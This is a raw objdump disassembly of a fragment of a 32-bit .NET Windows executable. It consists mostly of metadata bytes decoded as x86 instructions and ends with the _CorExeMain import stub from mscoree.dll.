  40c1c4:	08 1d 12 80 c9 08    	or     %bl,0x8c98012
  40c1ca:	12 80 c9 12 80 cd    	adc    -0x327fed37(%eax),%al
  40c1d0:	12 80 d1 1d 0e 0c    	adc    0xc0e1dd1(%eax),%al
  40c1d6:	20 03                	and    %al,(%ebx)
  40c1d8:	01 11                	add    %edx,(%ecx)
  40c1da:	80 d5 11             	adc    $0x11,%ch
  40c1dd:	80 d9 11             	sbb    $0x11,%cl
  40c1e0:	80 dd 05             	sbb    $0x5,%ch
  40c1e3:	00 02                	add    %al,(%edx)
  40c1e5:	02 0e                	add    (%esi),%cl
  40c1e7:	0e                   	push   %cs
  40c1e8:	06                   	push   %es
  40c1e9:	20 01                	and    %al,(%ecx)
  40c1eb:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40c1f0:	20 01                	and    %al,(%ecx)
  40c1f2:	08 08                	or     %cl,(%eax)
  40c1f4:	07                   	pop    %es
  40c1f5:	00 01                	add    %al,(%ecx)
  40c1f7:	1d 12 80 c9 0e       	sbb    $0xec98012,%eax
  40c1fc:	07                   	pop    %es
  40c1fd:	20 02                	and    %al,(%edx)
  40c1ff:	01 12                	add    %edx,(%edx)
  40c201:	80 c9 08             	or     $0x8,%cl
  40c204:	06                   	push   %es
  40c205:	20 01                	and    %al,(%ecx)
  40c207:	01 12                	add    %edx,(%edx)
  40c209:	80 f1 09             	xor    $0x9,%cl
  40c20c:	20 02                	and    %al,(%edx)
  40c20e:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40c213:	80 f5 05             	xor    $0x5,%ch
  40c216:	20 02                	and    %al,(%edx)
  40c218:	08 08                	or     %cl,(%eax)
  40c21a:	08 06                	or     %al,(%esi)
  40c21c:	20 02                	and    %al,(%edx)
  40c21e:	01 12                	add    %edx,(%edx)
  40c220:	0d 02 05 20 02       	or     $0x2200502,%eax
  40c225:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40c228:	09 20                	or     %esp,(%eax)
  40c22a:	03 01                	add    (%ecx),%eax
  40c22c:	12 61 02             	adc    0x2(%ecx),%ah
  40c22f:	12 81 01 05 20 00    	adc    0x200501(%ecx),%al
  40c235:	12 81 05 0b 20 04    	adc    0x4200b05(%ecx),%al
  40c23b:	01 0e                	add    %ecx,(%esi)
  40c23d:	12 81 09 11 81 0d    	adc    0xd811109(%ecx),%al
  40c243:	02 09                	add    (%ecx),%cl
  40c245:	20 04 01             	and    %al,(%ecx,%eax,1)
  40c248:	12 81 15 1c 08 08    	adc    0x8081c15(%ecx),%al
  40c24e:	0c 20                	or     $0x20,%al
  40c250:	05 12 25 1d 05       	add    $0x51d2512,%eax
  40c255:	08 08                	or     %cl,(%eax)
  40c257:	12 81 19 1c 06 00    	adc    0x61c19(%ecx),%al
  40c25d:	01 11                	add    %edx,(%ecx)
  40c25f:	81 21 0e 05 20 01    	andl   $0x120050e,(%ecx)
  40c265:	02 12                	add    (%edx),%dl
  40c267:	19 04 07             	sbb    %eax,(%edi,%eax,1)
  40c26a:	02 08                	add    (%eax),%cl
  40c26c:	08 05 20 01 08 12    	or     %al,0x12080120
  40c272:	25 06 00 02 08       	and    $0x8020006,%eax
  40c277:	1d 05 08 07 20       	sbb    $0x20070805,%eax
  40c27c:	03 08                	add    (%eax),%ecx
  40c27e:	1d 05 08 08 06       	sbb    $0x6080805,%eax
  40c283:	20 01                	and    %al,(%ecx)
  40c285:	01 12                	add    %edx,(%edx)
  40c287:	81 29 04 20 01 01    	subl   $0x1012004,(%ecx)
  40c28d:	1c 0c                	sbb    $0xc,%al
  40c28f:	07                   	pop    %es
  40c290:	06                   	push   %es
  40c291:	1c 02                	sbb    $0x2,%al
  40c293:	1d 05 12 81 2d       	sbb    $0x2d811205,%eax
  40c298:	08 1d 05 06 00 02    	or     %bl,0x2000605
  40c29e:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40c2a1:	02 07                	add    (%edi),%al
  40c2a3:	20 02                	and    %al,(%edx)
  40c2a5:	02 08                	add    (%eax),%cl
  40c2a7:	11 81 35 07 20 03    	adc    %eax,0x3200735(%ecx)
  40c2ad:	01 1d 05 08 08 1a    	add    %ebx,0x1a080805
  40c2b3:	07                   	pop    %es
  40c2b4:	0a 12                	or     (%edx),%dl
  40c2b6:	81 3d 0e 1d 12 81 41 	cmpl   $0x81120841,0x81121d0e
  40c2bd:	08 12 81 
  40c2c0:	41                   	inc    %ecx
  40c2c1:	12 81 45 12 81 49    	adc    0x49811245(%ecx),%al
  40c2c7:	1d 05 0e 12 81       	sbb    $0x81120e05,%eax
  40c2cc:	4d                   	dec    %ebp
  40c2cd:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40c2d2:	0e                   	push   %cs
  40c2d3:	05 00 00 12 81       	add    $0x81120000,%eax
  40c2d8:	41                   	inc    %ecx
  40c2d9:	05 20 00 12 81       	add    $0x81120020,%eax
  40c2de:	55                   	push   %ebp
  40c2df:	06                   	push   %es
  40c2e0:	00 00                	add    %al,(%eax)
  40c2e2:	1d 12 81 41 05       	sbb    $0x5418112,%eax
  40c2e7:	00 01                	add    %al,(%ecx)
  40c2e9:	0e                   	push   %cs
  40c2ea:	1d 0e 06 20 01       	sbb    $0x120060e,%eax
  40c2ef:	01 11                	add    %edx,(%ecx)
  40c2f1:	81 5d 08 00 01 12 81 	sbbl   $0x81120100,0x8(%ebp)
  40c2f8:	41                   	inc    %ecx
  40c2f9:	12 81 45 04 06 12    	adc    0x12060445(%ecx),%al
  40c2ff:	81 49 09 20 02 12 81 	orl    $0x81120220,0x9(%ecx)
  40c306:	49                   	dec    %ecx
  40c307:	0e                   	push   %cs
  40c308:	11 81 69 06 00 03    	adc    %eax,0x3000669(%ecx)
  40c30e:	0e                   	push   %cs
  40c30f:	0e                   	push   %cs
  40c310:	0e                   	push   %cs
  40c311:	0e                   	push   %cs
  40c312:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c317:	1c 07                	sbb    $0x7,%al
  40c319:	20 02                	and    %al,(%edx)
  40c31b:	01 0e                	add    %ecx,(%esi)
  40c31d:	11 81 75 04 07 02    	adc    %eax,0x2070475(%ecx)
  40c323:	0a 02                	or     (%edx),%al
  40c325:	10 07                	adc    %al,(%edi)
  40c327:	06                   	push   %es
  40c328:	12 81 85 12 81 89    	adc    -0x767eed7b(%ecx),%al
  40c32e:	12 81 8d 12 81 91    	adc    -0x6e7eed73(%ecx),%al
  40c334:	0e                   	push   %cs
  40c335:	02 05 20 00 12 81    	add    0x81120020,%al
  40c33b:	89 05 20 00 12 81    	mov    %eax,0x81120020
  40c341:	8d 05 20 00 12 81    	lea    0x81120020,%eax
  40c347:	91                   	xchg   %eax,%ecx
  40c348:	04 20                	add    $0x20,%al
  40c34a:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40c34d:	04 07                	add    $0x7,%al
  40c34f:	02 02                	add    (%edx),%al
  40c351:	02 03                	add    (%ebx),%al
  40c353:	20 00                	and    %al,(%eax)
  40c355:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40c358:	02 18                	add    (%eax),%bl
  40c35a:	02 03                	add    (%ebx),%al
  40c35c:	07                   	pop    %es
  40c35d:	01 0e                	add    %ecx,(%esi)
  40c35f:	05 00 00 12 81       	add    $0x81120000,%eax
  40c364:	9d                   	popf
  40c365:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40c36a:	1c 0a                	sbb    $0xa,%al
  40c36c:	07                   	pop    %es
  40c36d:	05 1d 05 12 35       	add    $0x3512051d,%eax
  40c372:	1d 05 08 05 05       	sbb    $0x5050805,%eax
  40c377:	20 01                	and    %al,(%ecx)
  40c379:	12 35 0e 05 20 02    	adc    0x220050e,%dh
  40c37f:	0e                   	push   %cs
  40c380:	08 08                	or     %cl,(%eax)
  40c382:	06                   	push   %es
  40c383:	07                   	pop    %es
  40c384:	02 02                	add    (%edx),%al
  40c386:	11 81 ad 05 20 02    	adc    %eax,0x22005ad(%ecx)
  40c38c:	0e                   	push   %cs
  40c38d:	0e                   	push   %cs
  40c38e:	0e                   	push   %cs
  40c38f:	05 20 00 11 81       	add    $0x81110020,%eax
  40c394:	ad                   	lods   %ds:(%esi),%eax
  40c395:	05 00 00 12 81       	add    $0x81120000,%eax
  40c39a:	b9 06 20 01 01       	mov    $0x1012006,%ecx
  40c39f:	12 81 b9 06 20 01    	adc    0x12006b9(%ecx),%al
  40c3a5:	02 11                	add    (%ecx),%dl
  40c3a7:	81 c1 11 07 05 12    	add    $0x12050711,%ecx
  40c3ad:	81 85 15 12 41 01 0e 	addl   $0x8d81120e,0x1411215(%ebp)
  40c3b4:	12 81 8d 
  40c3b7:	12 81 91 0e 05 15    	adc    0x15050e91(%ecx),%al
  40c3bd:	12 41 01             	adc    0x1(%ecx),%al
  40c3c0:	0e                   	push   %cs
  40c3c1:	05 20 01 01 13       	add    $0x13010120,%eax
  40c3c6:	00 05 20 00 1d 13    	add    %al,0x131d0020
  40c3cc:	00 06                	add    %al,(%esi)
  40c3ce:	00 02                	add    %al,(%edx)
  40c3d0:	0e                   	push   %cs
  40c3d1:	0e                   	push   %cs
  40c3d2:	1d 0e 08 07 03       	sbb    $0x307080e,%eax
  40c3d7:	1d 12 29 08 12       	sbb    $0x12082912,%eax
  40c3dc:	29 05 00 00 1d 12    	sub    %eax,0x121d0000
  40c3e2:	29 05 20 00 11 81    	sub    %eax,0x81110020
  40c3e8:	c5 09                	lds    (%ecx),%ecx
  40c3ea:	00 02                	add    %al,(%edx)
  40c3ec:	02 11                	add    (%ecx),%dl
  40c3ee:	81 c5 11 81 c5 05    	add    $0x5c58111,%ebp
  40c3f4:	07                   	pop    %es
  40c3f5:	02 12                	add    (%edx),%dl
  40c3f7:	35 0e 07 20 03       	xor    $0x320070e,%eax
  40c3fc:	01 02                	add    %eax,(%edx)
  40c3fe:	0e                   	push   %cs
  40c3ff:	10 02                	adc    %al,(%edx)
  40c401:	06                   	push   %es
  40c402:	00 01                	add    %al,(%ecx)
  40c404:	01 12                	add    %edx,(%edx)
  40c406:	81 cd 06 07 02 12    	or     $0x12020706,%ebp
  40c40c:	81 49 02 08 20 03 01 	orl    $0x1032008,0x2(%ecx)
  40c413:	0e                   	push   %cs
  40c414:	1c 11                	sbb    $0x11,%al
  40c416:	81 d5 07 07 02 12    	adc    $0x12020707,%ebp
  40c41c:	81 49 1d 05 06 20 01 	orl    $0x1200605,0x1d(%ecx)
  40c423:	12 81 49 0e 02 1d    	adc    0x1d020e49(%ecx),%al
  40c429:	05 07 20 02 12       	add    $0x12022007,%eax
  40c42e:	81 49 0e 02 0e 07 04 	orl    $0x4070e02,0xe(%ecx)
  40c435:	12 60 0e             	adc    0xe(%eax),%ah
  40c438:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40c43d:	12 60 12             	adc    0x12(%eax),%ah
  40c440:	60                   	pusha
  40c441:	06                   	push   %es
  40c442:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c447:	60                   	pusha
  40c448:	10 10                	adc    %dl,(%eax)
  40c44a:	01 01                	add    %eax,(%ecx)
  40c44c:	15 12 41 01 1e       	adc    $0x1e014112,%eax
  40c451:	00 15 12 81 e1 01    	add    %dl,0x1e18112
  40c457:	1e                   	push   %ds
  40c458:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c45b:	01 12                	add    %edx,(%edx)
  40c45d:	60                   	pusha
  40c45e:	09 20                	or     %esp,(%eax)
  40c460:	00 15 11 81 d9 01    	add    %dl,0x1d98111
  40c466:	13 00                	adc    (%eax),%eax
  40c468:	07                   	pop    %es
  40c469:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40c46e:	12 60 04             	adc    0x4(%eax),%ah
  40c471:	20 00                	and    %al,(%eax)
  40c473:	13 00                	adc    (%eax),%eax
  40c475:	05 20 01 02 13       	add    $0x13020120,%eax
  40c47a:	00 03                	add    %al,(%ebx)
  40c47c:	07                   	pop    %es
  40c47d:	01 1c 05 00 00 12 81 	add    %ebx,-0x7eee0000(,%eax,1)
  40c484:	e5 07                	in     $0x7,%eax
  40c486:	20 01                	and    %al,(%ecx)
  40c488:	12 81 e9 1d 05 06    	adc    0x6051de9(%ecx),%al
  40c48e:	20 01                	and    %al,(%ecx)
  40c490:	12 81 ed 0e 06 00    	adc    0x60eed(%ecx),%al
  40c496:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c499:	81 ed 08 00 01 12    	sub    $0x12010008,%ebp
  40c49f:	81 ed 11 81 f5 09    	sub    $0x9f58111,%ebp
  40c4a5:	00 02                	add    %al,(%edx)
  40c4a7:	12 81 f9 11 81 fd    	adc    -0x27eee07(%ecx),%al
  40c4ad:	0e                   	push   %cs
  40c4ae:	1c 00                	sbb    $0x0,%al
  40c4b0:	05 12 82 05 11       	add    $0x11058212,%eax
  40c4b5:	82 09 0e             	orb    $0xe,(%ecx)
  40c4b8:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40c4bd:	12 81 ed 12 81 ed    	adc    -0x127eed13(%ecx),%al
  40c4c3:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40c4c8:	12 81 f9 17 15 12    	adc    0x121517f9(%ecx),%al
  40c4ce:	45                   	inc    %ebp
  40c4cf:	01 15 12 49 0a 12    	add    %edx,0x120a4912
  40c4d5:	4d                   	dec    %ebp
  40c4d6:	1c 12                	sbb    $0x12,%al
  40c4d8:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40c4dd:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c4e2:	0e                   	push   %cs
  40c4e3:	0b 00                	or     (%eax),%eax
  40c4e5:	01 15 12 45 01 13    	add    %edx,0x13014512
  40c4eb:	00 12                	add    %dl,(%edx)
  40c4ed:	82 05 03 06 13 00 13 	addb   $0x13,0x130603
  40c4f4:	15 12 49 0a 12       	adc    $0x120a4912,%eax
  40c4f9:	4d                   	dec    %ebp
  40c4fa:	1c 12                	sbb    $0x12,%al
  40c4fc:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40c501:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c506:	0e                   	push   %cs
  40c507:	17                   	pop    %ss
  40c508:	20 0a                	and    %cl,(%edx)
  40c50a:	01 13                	add    %edx,(%ebx)
  40c50c:	00 13                	add    %dl,(%ebx)
  40c50e:	01 13                	add    %edx,(%ebx)
  40c510:	02 13                	add    (%ebx),%dl
  40c512:	03 13                	add    (%ebx),%edx
  40c514:	04 13                	add    $0x13,%al
  40c516:	05 13 06 13 07       	add    $0x7130613,%eax
  40c51b:	13 08                	adc    (%eax),%ecx
  40c51d:	13 09                	adc    (%ecx),%ecx
  40c51f:	05 07 01 12 82       	add    $0x82120107,%eax
  40c524:	0d 07 20 03 01       	or     $0x1032007,%eax
  40c529:	0e                   	push   %cs
  40c52a:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  40c52f:	01 1d 05 08 12 07    	add    %ebx,0x7120805
  40c535:	06                   	push   %es
  40c536:	12 81 2d 12 82 19    	adc    0x1982122d(%ecx),%al
  40c53c:	12 82 1d 12 82 21    	adc    0x2182121d(%edx),%al
  40c542:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40c547:	20 01                	and    %al,(%ecx)
  40c549:	01 11                	add    %edx,(%ecx)
  40c54b:	82 2d 06 20 01 01 11 	subb   $0x11,0x1012006
  40c552:	82 31 05             	xorb   $0x5,(%ecx)
  40c555:	20 00                	and    %al,(%eax)
  40c557:	12 82 35 0b 20 03    	adc    0x3200b35(%edx),%al
  40c55d:	01 12                	add    %edx,(%edx)
  40c55f:	61                   	popa
  40c560:	12 82 35 11 82 39    	adc    0x39821135(%edx),%al
  40c566:	08 20                	or     %ah,(%eax)
  40c568:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  40c56e:	08 1a                	or     %bl,(%edx)
  40c570:	07                   	pop    %es
  40c571:	0a 12                	or     (%edx),%dl
  40c573:	81 2d 12 82 19 12 82 	subl   $0x51d2182,0x12198212
  40c57a:	21 1d 05 
  40c57d:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40c582:	82 1d 1d 05 1d 05 1d 	sbbb   $0x1d,0x51d051d
  40c589:	05 0c 00 05 01       	add    $0x105000c,%eax
  40c58e:	12 82 45 08 12 82    	adc    -0x7dedf7bb(%edx),%al
  40c594:	45                   	inc    %ebp
  40c595:	08 08                	or     %cl,(%eax)
  40c597:	04 07                	add    $0x7,%al
  40c599:	02 02                	add    (%edx),%al
  40c59b:	08 09                	or     %cl,(%ecx)
  40c59d:	00 02                	add    %al,(%edx)
  40c59f:	01 12                	add    %edx,(%edx)
  40c5a1:	82 45 11 82          	addb   $0x82,0x11(%ebp)
  40c5a5:	4d                   	dec    %ebp
  40c5a6:	0d 07 06 1d 05       	or     $0x51d0607,%eax
  40c5ab:	12 82 51 12 35 1d    	adc    0x1d351251(%edx),%al
  40c5b1:	05 08 05 07 07       	add    $0x7070508,%eax
  40c5b6:	02 12                	add    (%edx),%dl
  40c5b8:	82 51 1d 05          	adcb   $0x5,0x1d(%ecx)
  40c5bc:	08 07                	or     %al,(%edi)
  40c5be:	04 12                	add    $0x12,%al
  40c5c0:	35 1d 05 08 05       	xor    $0x508051d,%eax
  40c5c5:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40c5ca:	1c 06                	sbb    $0x6,%al
  40c5cc:	07                   	pop    %es
  40c5cd:	03 1d 05 08 08 05    	add    0x5080805,%ebx
  40c5d3:	20 01                	and    %al,(%ecx)
  40c5d5:	13 00                	adc    (%eax),%eax
  40c5d7:	08 04 07             	or     %al,(%edi,%eax,1)
  40c5da:	01 12                	add    %edx,(%edx)
  40c5dc:	60                   	pusha
  40c5dd:	0e                   	push   %cs
  40c5de:	07                   	pop    %es
  40c5df:	05 08 08 0e 15       	add    $0x150e0808,%eax
  40c5e4:	11 81 d9 01 12 60    	adc    %eax,0x601201d9(%ecx)
  40c5ea:	12 60 07             	adc    0x7(%eax),%ah
  40c5ed:	07                   	pop    %es
  40c5ee:	04 08                	add    $0x8,%al
  40c5f0:	05 1d 05 08 04       	add    $0x408051d,%eax
  40c5f5:	20 01                	and    %al,(%ecx)
  40c5f7:	01 05 04 07 01 11    	add    %eax,0x11010704
  40c5fd:	64 04 00             	fs add $0x0,%al
  40c600:	01 0b                	add    %ecx,(%ebx)
  40c602:	0a 04 00             	or     (%eax,%eax,1),%al
  40c605:	01 0b                	add    %ecx,(%ebx)
  40c607:	0e                   	push   %cs
  40c608:	04 00                	add    $0x0,%al
  40c60a:	01 0b                	add    %ecx,(%ebx)
  40c60c:	0d 04 00 01 0b       	or     $0xb010004,%eax
  40c611:	0c 06                	or     $0x6,%al
  40c613:	00 01                	add    %al,(%ecx)
  40c615:	0b 11                	or     (%ecx),%edx
  40c617:	81 ad 04 00 01 0a 0a 	subl   $0x100040a,0xa010004(%ebp)
  40c61e:	04 00 01 
  40c621:	0a 0e                	or     (%esi),%cl
  40c623:	04 00                	add    $0x0,%al
  40c625:	01 0a                	add    %ecx,(%edx)
  40c627:	0d 04 00 01 0a       	or     $0xa010004,%eax
  40c62c:	0c 06                	or     $0x6,%al
  40c62e:	00 01                	add    %al,(%ecx)
  40c630:	0a 11                	or     (%ecx),%dl
  40c632:	81 ad 04 00 01 0d 0a 	subl   $0x100040a,0xd010004(%ebp)
  40c639:	04 00 01 
  40c63c:	0d 0e 07 07 02       	or     $0x207070e,%eax
  40c641:	11 64 11 81          	adc    %esp,-0x7f(%ecx,%edx,1)
  40c645:	ad                   	lods   %ds:(%esi),%eax
  40c646:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40c64b:	0c 07                	or     $0x7,%al
  40c64d:	07                   	pop    %es
  40c64e:	02 1d 05 12 81 71    	add    0x71811205,%bl
  40c654:	0d 20 04 01 0e       	or     $0xe010420,%eax
  40c659:	11 81 75 11 82 61    	adc    %eax,0x61821175(%ecx)
  40c65f:	11 82 65 0b 07 06    	adc    %eax,0x6070b65(%edx)
  40c665:	12 60 1d             	adc    0x1d(%eax),%ah
  40c668:	0e                   	push   %cs
  40c669:	0e                   	push   %cs
  40c66a:	08 12                	or     %dl,(%edx)
  40c66c:	60                   	pusha
  40c66d:	08 05 07 01 12 81    	or     %al,0x81120107
  40c673:	2d 05 07 01 12       	sub    $0x12010705,%eax
  40c678:	81 71 07 07 04 05 1d 	xorl   $0x1d050407,0x7(%ecx)
  40c67f:	05 08 08 06 00       	add    $0x60808,%eax
  40c684:	02 07                	add    (%edi),%al
  40c686:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c68b:	02 0c 1d 05 08 06 00 	add    0x60805(,%ebx,1),%cl
  40c692:	02 0d 1d 05 08 06    	add    0x608051d,%cl
  40c698:	00 02                	add    %al,(%edx)
  40c69a:	09 1d 05 08 06 00    	or     %ebx,0x60805
  40c6a0:	02 0b                	add    (%ebx),%cl
  40c6a2:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c6a7:	02 06                	add    (%esi),%al
  40c6a9:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c6ae:	02 0a                	add    (%edx),%cl
  40c6b0:	1d 05 08 09 07       	sbb    $0x7090805,%eax
  40c6b5:	03 12                	add    (%edx),%edx
  40c6b7:	81 2d 1d 05 1d 05 05 	subl   $0x12020705,0x51d051d
  40c6be:	07 02 12 
  40c6c1:	60                   	pusha
  40c6c2:	02 04 07             	add    (%edi,%eax,1),%al
  40c6c5:	01 1d 05 05 07 02    	add    %ebx,0x2070505
  40c6cb:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  40c6d0:	04 1d                	add    $0x1d,%al
  40c6d2:	05 1d 05 08 05       	add    $0x508051d,%eax
  40c6d7:	06                   	push   %es
  40c6d8:	07                   	pop    %es
  40c6d9:	03 1d 05 08 05 05    	add    0x5050805,%ebx
  40c6df:	00 01                	add    %al,(%ecx)
  40c6e1:	1d 05 0b 0f 07       	sbb    $0x70f0b05,%eax
  40c6e6:	06                   	push   %es
  40c6e7:	12 81 2d 1d 05 08    	adc    0x8051d2d(%ecx),%al
  40c6ed:	12 82 69 1d 05 1d    	adc    0x1d051d69(%edx),%al
  40c6f3:	05 08 20 02 01       	add    $0x1022008,%eax
  40c6f8:	12 61 11             	adc    0x11(%ecx),%ah
  40c6fb:	82 6d 0c 07          	subb   $0x7,0xc(%ebp)
  40c6ff:	04 12                	add    $0x12,%al
  40c701:	81 2d 1d 05 12 82 69 	subl   $0x51d69,0x8212051d
  40c708:	1d 05 00 
  40c70b:	00 34 c7             	add    %dh,(%edi,%eax,8)
	...
  40c716:	00 00                	add    %al,(%eax)
  40c718:	4e                   	dec    %esi
  40c719:	c7 00 00 00 20 00    	movl   $0x200000,(%eax)
	...
  40c733:	00 40 c7             	add    %al,-0x39(%eax)
	...
  40c742:	5f                   	pop    %edi
  40c743:	43                   	inc    %ebx
  40c744:	6f                   	outsl  %ds:(%esi),(%dx)
  40c745:	72 45                	jb     0x40c78c
  40c747:	78 65                	js     0x40c7ae
  40c749:	4d                   	dec    %ebp
  40c74a:	61                   	popa
  40c74b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40c752:	72 65                	jb     0x40c7b9
  40c754:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40c758:	6c                   	insb   (%dx),%es:(%edi)
  40c759:	00 00                	add    %al,(%eax)
  40c75b:	00 00                	add    %al,(%eax)
  40c75d:	00 ff                	add    %bh,%bh
  40c75f:	25 00 20 40 00       	and    $0x402000,%eax
